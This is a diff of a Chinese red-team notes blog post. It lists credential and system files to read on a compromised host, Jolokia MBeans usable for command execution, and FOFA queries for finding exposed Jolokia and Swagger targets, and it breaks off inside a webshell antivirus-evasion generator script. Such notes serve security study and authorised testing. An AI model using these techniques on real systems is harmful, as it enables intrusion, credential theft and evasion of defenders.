@@ -1,253 +1,164 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 8.1.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"shaoxinsec.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
-  </script>
-
-  <meta name="description" content="反溯源 网络隔离：  系统代理：ClashVerge&#x2F;V2rayN + 机场节点  代理池：爆破的时候，选择代理池，避免单个节点被封   1[proxifly|每5min获取全球免费节点]: https:&#x2F;&#x2F;github.com&#x2F;proxifly&#x2F;free-proxy-list&#x2F;blob&#x2F;main&#x2F;proxies&#x2F;all&#x2F;data.txt   环境隔离：在虚拟机里面搭建攻击机&amp;#x2">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RedteamNotes | 少欣安全</title><meta name="author" content="shaoxinSEC"><meta name="copyright" content="shaoxinSEC"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="反溯源 网络隔离：  系统代理：ClashVerge&#x2F;V2rayN + 机场节点  代理池：爆破的时候，选择代理池，避免单个节点被封   1[proxifly|每5min获取全球免费节点]: https:&#x2F;&#x2F;github.com&#x2F;proxifly&#x2F;free-proxy-list&#x2F;blob&#x2F;main&#x2F;proxies&#x2F;all&#x2F;data.txt   环境隔离：在虚拟机里面搭建攻击机&amp;#x2">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RedteamNotes">
 <meta property="og:url" content="https://shaoxinsec.github.io/2025/11/04/RedteamNotes/index.html">
 <meta property="og:site_name" content="少欣安全">
 <meta property="og:description" content="反溯源 网络隔离：  系统代理：ClashVerge&#x2F;V2rayN + 机场节点  代理池：爆破的时候，选择代理池，避免单个节点被封   1[proxifly|每5min获取全球免费节点]: https:&#x2F;&#x2F;github.com&#x2F;proxifly&#x2F;free-proxy-list&#x2F;blob&#x2F;main&#x2F;proxies&#x2F;all&#x2F;data.txt   环境隔离：在虚拟机里面搭建攻击机&amp;#x2">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104153547126.png">
-<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104153650613.png">
-<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104154057560.png">
-<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010210705756.png">
-<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010210749738.png">
-<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010211001369.png">
-<meta property="og:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251010211458999.png">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shaoxinsec.github.io/img/avatar.jpg">
 <meta property="article:published_time" content="2025-11-04T03:54:34.000Z">
-<meta property="article:modified_time" content="2025-11-07T02:31:53.606Z">
+<meta property="article:modified_time" content="2025-11-10T07:21:32.618Z">
 <meta property="article:author" content="shaoxinSEC">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251104153547126.png">
-
-<link rel="canonical" href="https://shaoxinsec.github.io/2025/11/04/RedteamNotes/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'en'
-  };
-</script>
-
-  <title>RedteamNotes | 少欣安全</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">少欣安全</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
-
-  </li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div id="search-result">
-  <div id="no-result">
-    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
-  </div>
-</div>
-
-    </div>
-  </div>
-
-</div>
-    </header>
-
-    
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://shaoxinsec.github.io/2025/11/04/RedteamNotes/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="shaoxinSEC">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少欣安全">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          RedteamNotes
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-11-04 11:54:34" itemprop="dateCreated datePublished" datetime="2025-11-04T11:54:34+08:00">2025-11-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-11-07 10:31:53" itemprop="dateModified" datetime="2025-11-07T10:31:53+08:00">2025-11-07</time>
-              </span>
-
-          
-            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">Views: </span>
-              <span id="busuanzi_value_page_pv"></span>
-            </span><br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>36k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>33 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+<meta name="twitter:image" content="https://shaoxinsec.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "RedteamNotes",
+  "url": "https://shaoxinsec.github.io/2025/11/04/RedteamNotes/",
+  "image": "https://shaoxinsec.github.io/img/avatar.jpg",
+  "datePublished": "2025-11-04T03:54:34.000Z",
+  "dateModified": "2025-11-10T07:21:32.618Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "shaoxinSEC",
+      "url": "https://shaoxinsec.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://shaoxinsec.github.io/2025/11/04/RedteamNotes/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
       
-        <meta name="referrer" content="no-referrer"/>
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RedteamNotes',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">少欣安全</span></a><a class="nav-page-title" href="/"><span class="site-name">RedteamNotes</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">RedteamNotes</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-04T03:54:34.000Z" title="发表于 2025-11-04 11:54:34">2025-11-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-10T07:21:32.618Z" title="更新于 2025-11-10 15:21:32">2025-11-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><meta name="referrer" content="no-referrer"/>
 
 <h2 id="反溯源"><a href="#反溯源" class="headerlink" title="反溯源"></a>反溯源</h2><ol>
 <li><p>网络隔离：</p>
@@ -345,7 +256,8 @@
   <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0. 方向：找账号密码、程序源码/二进制（逆向找key、找密码）</span><br><span class="line">1. 历史命令（如mysql -uroot -proot）：/root/.bash_history、/home/username/.bash_history</span><br><span class="line">2. SSH公钥：/root/.ssh/id_rsa、/root/.ssh/authorized_keys</span><br><span class="line">3. 系统信息：/etc/redhat-release</span><br><span class="line">4. 本地文件的配置信息：var/lib/mlocate/mlocate.db</span><br><span class="line">5. 当前用户：/proc/self/loginuid</span><br><span class="line">6. 环境变量：/proc/self/environ</span><br><span class="line">7. 内网ip：/proc/net/fib_trie</span><br><span class="line">8. 当前进程对应的PID：/proc/sched_debug</span><br></pre></td></tr></table></figure></li>
 </ul>
 </li>
-<li><p>内置的一些高危MBean命令，具体可参考JAVA-Jolokia这一小节</p>
+<li><p>actuator下的敏感接口未授权访问，导致泄露敏感信息</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110145553277.png" alt="image-20251110145553277"></p>
 </li>
 </ol>
 <h4 id="JAVA-Jolokia"><a href="#JAVA-Jolokia" class="headerlink" title="JAVA-Jolokia"></a>JAVA-Jolokia</h4><ol>
@@ -386,9 +298,21 @@
  <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1. javax.management.loading:type=DefaultLoaderRepository</span><br><span class="line">    危险操作：loadClass 或 loadClassWithoutBind 方法</span><br><span class="line">    作用：加载外部类字节码到 JVM。</span><br><span class="line">    风险：若攻击者可控类字节码（如包含恶意静态代码块或方法），可执行任意代码（如命令执行、文件读写）。</span><br><span class="line">2. com.sun.management:type=DiagnosticCommand</span><br><span class="line">    危险操作：vmCommand 或具体命令方法（如 execute）</span><br><span class="line">    作用：执行 JVM 诊断命令（如 jmap、jstack 等效功能）。</span><br><span class="line">    风险：部分命令可读取进程内存、线程信息，甚至在特定 JDK 版本中通过参数注入执行系统命令。</span><br><span class="line">3. java.lang:type=Runtime</span><br><span class="line">    危险操作：exec(String command) 方法</span><br><span class="line">    作用：直接执行系统命令（如 ls、rm、bash 等）。</span><br><span class="line">    风险：最直接的命令执行入口，若可调用，攻击者可完全控制服务器。</span><br><span class="line">4. java.nio:type=FileSystem（部分 JDK 实现）</span><br><span class="line">    危险操作：createFile、deleteFile、write 等文件操作方法</span><br><span class="line">    风险：读写 / 删除服务器任意文件（如 /etc/passwd、应用配置文件）。</span><br><span class="line">5. java.lang:type=ClassLoading</span><br><span class="line">    危险操作：setClassPath 方法</span><br><span class="line">    作用：修改 JVM 类加载路径。</span><br><span class="line">    风险：加载恶意 JAR 包，触发代码执行。</span><br><span class="line">6. Tomcat：Catalina:type=Manager</span><br><span class="line">	危险操作：listSession（获取会话信息）、expireSession（销毁会话），结合其他漏洞可越权。</span><br><span class="line">7. Spring Boot：org.springframework.boot:type=Admin,name=SpringApplication</span><br><span class="line">	危险操作：shutdown 方法（直接关闭应用）。</span><br><span class="line">8. JBoss/Wildfly：jboss.system:type=ServerInfo</span><br><span class="line">	危险操作：listDeployments 结合部署接口可上传恶意 WAR 包。</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>资产定位</p>
- <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;\&quot;request\&quot;:&#123;\&quot;mbean\&quot;&quot; || body=&quot;\&quot;status\&quot;:200&quot; &amp;&amp; body=&quot;jolokia&quot;</span><br><span class="line">header=&quot;X-Jolokia-Version&quot; || (header=&quot;Content-Type: application/json&quot; &amp;&amp; body=&quot;/jolokia&quot;)</span><br><span class="line">body=&quot;\&quot;error_type\&quot;:\&quot;javax.management\&quot;&quot; &amp;&amp; body=&quot;/jolokia&quot;</span><br></pre></td></tr></table></figure></li>
+ <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;\&quot;request\&quot;:&#123;\&quot;mbean\&quot;&quot; || body=&quot;\&quot;status\&quot;:200&quot; &amp;&amp; body=&quot;jolokia&quot;</span><br><span class="line">header=&quot;X-Jolokia-Version&quot; || (header=&quot;Content-Type: application/json&quot; &amp;&amp; body=&quot;/jolokia&quot;)</span><br><span class="line">body=&quot;\&quot;error_type\&quot;:\&quot;javax.management\&quot;&quot; &amp;&amp; body=&quot;/jolokia&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/laluka/jolokia-exploitation-toolkit">https://github.com/laluka/jolokia-exploitation-toolkit</a></p>
+</li>
 </ol>
-<h3 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h3><h3 id="产品漏洞"><a href="#产品漏洞" class="headerlink" title="产品漏洞"></a>产品漏洞</h3><h2 id="Webshell免杀"><a href="#Webshell免杀" class="headerlink" title="Webshell免杀"></a>Webshell免杀</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ol>
+<h3 id="产品漏洞"><a href="#产品漏洞" class="headerlink" title="产品漏洞"></a>产品漏洞</h3><h4 id="OpenApi"><a href="#OpenApi" class="headerlink" title="OpenApi"></a>OpenApi</h4><ol>
+<li><p>OpenApi是一套用来介绍和简单测试网站中使用到的api的规范，很多的后端框架都遵循这套规范开发出了自己api测试&#x2F;说明的小工具，比如SpringBoot的SpringDoc、DRF（Django Rest Framework）的drf-spectacular、Flask的flask-restx和flask-openapi3、NodeJs的swagger-jsdoc等等。并且，OpenApi官方还默认提供了一个前端页面，用来在线浏览和测试api接口，很多实现OpenApi的工具默认都采用这个页面，如下图所示。一般来说，实现OpenApi的工具&#x2F;服务本身没有什么漏洞（功能比较单一），但是该页面&#x2F;接口地址不应当被公开（未授权访问），需要认证后才能访问，否则很容易泄露一些敏感的、有漏洞的api接口。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110133414687.png" alt="image-20251110133414687"></p>
+</li>
+<li><p>OpenApi规范最开始叫做swagger，从2.0版本（2014年）开始正式更名为OpenApi。如上面所讲，不同框架都有自己实现OpenApi规范的小组件，但基本上都默认采用OpenApi官方给出的页面作为测试界面，所以可以通过fofa批量查找这个页面：title&#x3D;”Swagger UI”</p>
+</li>
+<li><p>如果已经未授权访问到了swagger ui界面，那么可以批量测试其中的api：接口文档地址（一般在swagger ui界面上会有提示，改地址以纯文本的形式返回所有的api接口）&#x3D;&#x3D;&gt; postman&#x2F;apifox &#x3D;&#x3D;&gt; BurpSuite &#x3D;&#x3D;&gt; Xray。</p>
+</li>
+</ol>
+<h3 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h3><h2 id="Webshell免杀"><a href="#Webshell免杀" class="headerlink" title="Webshell免杀"></a>Webshell免杀</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><ol>
 <li><p>流量免杀</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_id</span>(<span class="params">length: <span class="built_in">int</span> = <span class="number">8</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;_0x<span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits.lower(), k=length))&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>(<span class="params">pwd: <span class="built_in">str</span>, algorithm: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据算法生成符合长度的密钥&quot;&quot;&quot;</span></span><br><span class="line">    key_length_map = &#123;</span><br><span class="line">        <span class="string">&#x27;aes-128-cbc&#x27;</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="string">&#x27;aes-192-cbc&#x27;</span>: <span class="number">24</span>,</span><br><span class="line">        <span class="string">&#x27;aes-256-cbc&#x27;</span>: <span class="number">32</span></span><br><span class="line">    &#125;</span><br><span class="line">    key_length = key_length_map[algorithm]</span><br><span class="line">    </span><br><span class="line">    salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">    iterations = <span class="number">100000</span></span><br><span class="line">    key = PBKDF2(pwd.encode(<span class="string">&#x27;utf-8&#x27;</span>), salt, dkLen=key_length, count=iterations)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> key.<span class="built_in">hex</span>(), salt.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_scripts</span>(<span class="params">args</span>):</span><br><span class="line">    key_hex, salt_hex = 